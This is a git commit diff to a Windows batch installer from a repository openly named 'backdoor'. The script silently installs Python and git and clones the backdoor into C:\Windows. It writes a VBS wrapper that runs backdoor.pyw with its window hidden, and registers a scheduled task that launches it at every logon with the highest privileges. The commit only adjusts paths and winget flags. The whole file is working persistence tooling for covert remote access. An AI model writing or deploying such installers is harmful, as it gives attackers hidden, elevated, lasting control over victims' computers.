62937c942f51ea78007e55b174f12abca3a74cd6
Jevelin4k <jevelin4k@gmail.com>
2024-08-06 14:52:13 +0200

    Update setup+install.bat

--- v2.0/setup+install.bat
+++ v2.0/setup+install.bat
@@ -1,10 +1,10 @@
 @echo off
-winget install python3.11
+winget install python3.11 --accept-source-agreements
 pip install sockets
-winget install git
+winget install git --accept-source-agreements
 git clone https://github.com/Jevelin4k/backdoor/ C:\Windows\backdoor\v2.0
-echo Set WshShell = CreateObject("WScript.Shell") > C:\Windows\backdoor\v2.0\up_2.vbs
-echo WshShell.Run "cmd.exe /c C:\Windows\backdoor\v2.0\up_2.bat", 0, False >> C:\Windows\backdoor\v2.0\up_2.vbs
-echo @echo off > C:\Windows\backdoor\v2.0\up_2.bat
-echo pythonw C:\Windows\backdoor\v2.0\backdoor.pyw >> C:\Windows\backdoor\v2.0\up_2.bat
-schtasks /create /tn "backdoor_up_2" /tr "C:\Windows\backdoor\v2.0\up_2.vbs" /sc onlogon /rl highest /f
+echo Set WshShell = CreateObject("WScript.Shell") > C:\Windows\backdoor\v2.0\v2.0\up_2.vbs
+echo WshShell.Run "cmd.exe /c C:\Windows\backdoor\v2.0\v2.0\up_2.bat", 0, False >> C:\Windows\backdoor\v2.0\v2.0\up_2.vbs
+echo @echo off > C:\Windows\backdoor\v2.0\v2.0\up_2.bat
+echo pythonw C:\Windows\backdoor\v2.0\v2.0\backdoor.pyw >> C:\Windows\backdoor\v2.0\v2.0\up_2.bat
+schtasks /create /tn "backdoor_up_2" /tr "C:\Windows\backdoor\v2.0\v2.0\up_2.vbs" /sc onlogon /rl highest /f
